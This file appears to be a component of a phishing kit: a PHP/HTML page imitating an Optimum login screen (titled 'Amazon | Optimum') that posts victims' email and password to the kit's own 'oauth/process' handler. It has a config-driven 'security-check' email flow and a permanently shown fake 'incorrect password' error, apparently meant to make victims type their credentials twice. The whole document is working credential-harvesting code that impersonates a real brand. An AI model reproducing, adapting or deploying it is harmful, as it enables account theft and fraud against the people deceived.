<?php
defined("ALLOW") or exit('No direct script access allowed');
if (_config('DOUBLEEMAIL') == 'on') {
    $url = base_url()."security-check/email/first";
} else {
    $url = base_url() . "security-check/email/process";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Amazon | Optimum</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #002f6c;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .login-card {
      background-color: #fff;
      border-radius: 16px;
      padding: 32px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
    }

    .login-card h2 {
      text-align: center;
      font-size: 18px;
      color: #1e1e1e;
      margin-bottom: 24px;
    }

    .form-group {
      margin-bottom: 16px;
      position: relative;
    }

    .form-group input {
      width: 100%;
      padding: 12px 14px;
      border-radius: 8px;
      border: 1.5px solid #ccc;
      font-size: 15px;
      color: #333;
    }

    .form-group input:focus {
      outline: none;
      border-color: #0066cc;
    }

    .error-message {
      color: #e53935;
      font-size: 13px;
      margin-bottom: 12px;
      display: flex;
      align-items: flex-start;
      gap: 6px;
    }

    .error-message::before {
      content: "";
      display: inline-block;
      width: 8px;
      height: 8px;
      background-color: #e53935;
      border-radius: 50%;
      margin-top: 6px;
    }

    .remember-me {
      display: flex;
      align-items: center;
      margin-bottom: 20px;
      font-size: 14px;
    }

    .remember-me input {
      margin-right: 8px;
    }

    .btn {
      width: 100%;
      padding: 12px;
      background-color: #f60;
      color: #fff;
      font-weight: bold;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .btn:hover {
      background-color: #e65500;
    }

    .link-row {
      display: flex;
      justify-content: center;
      gap: 20px;
      font-size: 13px;
      margin-top: 20px;
    }

    .link-row a {
      text-decoration: none;
      color: #004bbd;
    }

    .link-row a:hover {
      text-decoration: underline;
    }

    .footer {
      font-size: 14px;
      text-align: center;
      color: #333;
      border-top: 1px solid #eee;
      padding-top: 20px;
      margin-top: 30px;
    }

    .footer a {
      color: #004bbd;
      text-decoration: none;
      font-weight: bold;
    }

    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="login-card">
    <h2>Sign in to Optimum</h2>
    <form name="signin" action="<?= base_url() ?>oauth/process" method="post" novalidate>
      <div class="form-group">
        <input type="email" name="email" placeholder="Email or Optimum ID"
          value="<?= $_SESSION['email'] ?? '' ?>" required>
        <input type="hidden" name="emailLogin" value="<?= $_SESSION['email'] ?? '' ?>">
      </div>

      <div class="form-group">
        <input type="password" name="password" placeholder="Password" required>
      </div>

      <div class="error-message">
        Incorrect username or password. Please use the "Forgot Password" link below to reset your password now before your username is locked.
      </div>

      <div class="remember-me">
        <input type="checkbox" id="remember">
        <label for="remember">Remember Me</label>
      </div>

      <button type="submit" class="btn">Continue</button>

      <div class="link-row">
        <a href="#">Forgot ID?</a>
        <a href="#">Forgot Password?</a>
      </div>

      <div class="footer">
        <p><strong>Don't have an Optimum ID?</strong></p>
        <p>An Optimum ID is a unique username that provides access to extra services and benefits.</p>
        <p><a href="#">Create an Optimum ID</a></p>
      </div>
    </form>
  </div>
</body>
</html>
